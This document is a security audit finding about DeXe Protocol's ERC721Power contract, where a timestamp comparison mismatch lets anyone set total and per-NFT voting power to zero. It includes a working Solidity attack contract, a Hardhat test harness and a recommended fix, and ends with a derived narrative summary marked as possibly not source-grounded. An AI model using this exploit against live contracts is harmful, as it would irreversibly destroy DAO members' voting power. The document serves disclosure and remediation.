---
id: 19494
severity: "High"
---

# Attacker can destroy user voting power by setting `ERC721Power::totalPower` and all existing NFTs `currentPower` to 0

## Description

** Attacker can destroy user voting power by setting `ERC721Power::totalPower` & all existing nfts' `currentPower` to 0 via a permission-less attack contract by exploiting a discrepancy ("<" vs "<=") in `ERC721Power` [L144](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L144) & [L172](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L172):

```solidity
function recalculateNftPower(uint256 tokenId) public override returns (uint256 newPower) {
    // @audit execution allowed to continue when
    // block.timestamp == powerCalcStartTimestamp
    if (block.timestamp < powerCalcStartTimestamp) {
        return 0;
    }
    // @audit getNftPower() returns 0 when
    // block.timestamp == powerCalcStartTimestamp
    newPower = getNftPower(tokenId);

    NftInfo storage nftInfo = nftInfos[tokenId];

    // @audit as this is the first update since power
    // calculation has just started, totalPower will be
    // subtracted by nft's max power
    totalPower -= nftInfo.lastUpdate != 0 ? nftInfo.currentPower : getMaxPowerForNft(tokenId);
    // @audit totalPower += 0 (newPower = 0 in above line)
    totalPower += newPower;

    nftInfo.lastUpdate = uint64(block.timestamp);
    // @audit will set nft's current power to 0
    nftInfo.currentPower = newPower;
}

function getNftPower(uint256 tokenId) public view override returns (uint256) {
    // @audit execution always returns 0 when
    // block.timestamp == powerCalcStartTimestamp
    if (block.timestamp <= powerCalcStartTimestamp) {
        return 0;
```
This attack has to be run on the exact block that power calculation starts (when `block.timestamp == ERC721Power.powerCalcStartTimestamp`).

** `ERC721Power::totalPower` & all existing nft's `currentPower` are set 0, negating voting using `ERC721Power` since [`totalPower` is read when creating the snapshot](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L330-L331) and [`GovUserKeeper::getNftsPowerInTokensBySnapshot()` will return 0](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L546-L548) same as if the nft contract didn't exist. Can also negatively affect the ability to [create proposals](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L604-L606).

This attack is extremely devastating as the individual power of `ERC721Power` nfts can never be increased; it can only decrease over time if the required collateral is not deposited. By setting all nfts' `currentPower = 0` as soon as power calculation starts (`block.timestamp == ERC721Power.powerCalcStartTimestamp`) the `ERC721Power` contract is effectively completely bricked - there is no way to "undo" this attack unless the nft contract is replaced with a new contract.

Dexe-DAO can be created [using only nfts for voting](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L74); in this case this exploit which completely bricks the voting power of all nfts means a new DAO has to be re-deployed since no one can vote as everyone's voting power has been destroyed.

## Proof of Concept

** Add attack contract `mock/utils/ERC721PowerAttack.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../../gov/ERC721/ERC721Power.sol";

import "hardhat/console.sol";

contract ERC721PowerAttack {
    // this attack can decrease ERC721Power::totalPower by the the true max power of all
    // the power nfts that exist (to zero), regardless of who owns them, and sets the current
    // power of all nfts to zero, totally bricking the ERC721Power contract.
    //
    // this attack only works when block.timestamp == nftPower.powerCalcStartTimestamp
    // as it takes advantage of a difference in getNftPower() & recalculateNftPower():
    //
    // getNftPower() returns 0 when block.timestamp <= powerCalcStartTimestamp
    // recalculateNftPower returns 0 when block.timestamp < powerCalcStartTimestamp
    function attack(
        address nftPowerAddr,
        uint256 initialTotalPower,
        uint256 lastTokenId
    ) external {
        ERC721Power nftPower = ERC721Power(nftPowerAddr);

        // verify attack starts on the correct block
        require(
            block.timestamp == nftPower.powerCalcStartTimestamp(),
            "ERC721PowerAttack: attack requires block.timestamp == nftPower.powerCalcStartTimestamp"
        );

        // verify totalPower() correct at starting block
        require(
            nftPower.totalPower() == initialTotalPower,
            "ERC721PowerAttack: incorrect initial totalPower"
        );

        // call recalculateNftPower() for every nft, this:
        // 1) decreases ERC721Power::totalPower by that nft's max power
        // 2) sets that nft's currentPower = 0
        for (uint256 i = 1; i <= lastTokenId; ) {
            require(
                nftPower.recalculateNftPower(i) == 0,
                "ERC721PowerAttack: recalculateNftPower() should return 0 for new nft power"
            );

            unchecked {
                ++i;
            }
        }

        require(
            nftPower.totalPower() == 0,
            "ERC721PowerAttack: after attack finished totalPower should equal 0"
        );
    }
}
```

Add test harness to `ERC721Power.test.js`:
```javascript
describe("audit attacker can manipulate ERC721Power totalPower", () => {
    it("audit attack 1 sets ERC721Power totalPower & all nft currentPower to 0", async () => {
        // deploy the ERC721Power nft contract with:
        // max power of each nft = 100
        // power reduction 10%
        // required collateral = 100
        let maxPowerPerNft = toPercent("100");
        let requiredCollateral = wei("100");
        let powerCalcStartTime = (await getCurrentBlockTime()) + 1000;
        // hack needed to start attack contract on exact block due to hardhat
        // advancing block.timestamp in the background between function calls
        let powerCalcStartTime2 = (await getCurrentBlockTime()) + 999;

        // create power nft contract
        await deployNft(powerCalcStartTime, maxPowerPerNft, toPercent("10"), requiredCollateral);

        // ERC721Power::totalPower should be zero as no nfts yet created
        assert.equal((await nft.totalPower()).toFixed(), toPercent("0").times(1).toFixed());

        // create the attack contract
        const ERC721PowerAttack = artifacts.require("ERC721PowerAttack");
        let attackContract = await ERC721PowerAttack.new();

        // create 10 power nfts for SECOND
        await nft.safeMint(SECOND, 1);
        await nft.safeMint(SECOND, 2);
        await nft.safeMint(SECOND, 3);
        await nft.safeMint(SECOND, 4);
        await nft.safeMint(SECOND, 5);
        await nft.safeMint(SECOND, 6);
        await nft.safeMint(SECOND, 7);
        await nft.safeMint(SECOND, 8);
        await nft.safeMint(SECOND, 9);
        await nft.safeMint(SECOND, 10);

        // verify ERC721Power::totalPower has been increased by max power for all nfts
        assert.equal((await nft.totalPower()).toFixed(), maxPowerPerNft.times(10).toFixed());

        // fast forward time to the start of power calculation
        await setTime(powerCalcStartTime2);

        // launch the attack
        await attackContract.attack(nft.address, maxPowerPerNft.times(10).toFixed(), 10);
    });
});
```

Run attack with: `npx hardhat test --grep "audit attack 1 sets ERC721Power totalPower & all nft currentPower to 0"`

## Recommendation

** Resolve the discrepancy between `ERC721Power` [L144](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L144) & [L172](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L172).

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a permission‑less manipulation of the ERC721Power contract that allows an attacker to reduce the global voting power (totalPower) and the individual power of every existing NFT (currentPower) to zero. The root cause is a subtle mismatch between two time checks: the view function getNftPower returns zero when block.timestamp is less than or equal to powerCalcStartTimestamp, while the state‑changing function recalculateNftPower only returns zero when block.timestamp is strictly less than powerCalcStartTimestamp. When an attacker invokes recalculateNftPower for each token in the exact block where block.timestamp equals powerCalcStartTimestamp, the function proceeds, subtracts the NFT’s maximum power from totalPower, adds the newly calculated power (which is zero), and writes zero into the NFT’s currentPower field. By iterating over all token IDs, the attacker can set totalPower and every currentPower to zero in a single transaction without any special privileges. This results in the complete loss of voting power for all holders of ERC721Power NFTs: users who expect their NFTs to contribute voting weight suddenly see their voting power drop to zero, proposals become impossible to create, and the DAO becomes effectively bricked. The attack only succeeds on the precise block when the power calculation period starts, making it hard to detect during normal operation because the condition is fleeting and the contract otherwise behaves correctly. The issue was discovered during a security audit that examined the time‑based logic and confirmed the exploit with a dedicated attack contract and test harness. Because the state change is irreversible without redeploying the NFT contract, the bug violates the protocol’s accounting assumptions that voting power can only decrease over time due to collateral withdrawal, never be abruptly erased. The recommended fix is to harmonize the timestamp comparison in both functions—using the same inequality (e.g., <=) or restructuring the logic so that recalculateNftPower does not execute when the power calculation has just started—thereby preventing the zero‑power reset at the boundary block.
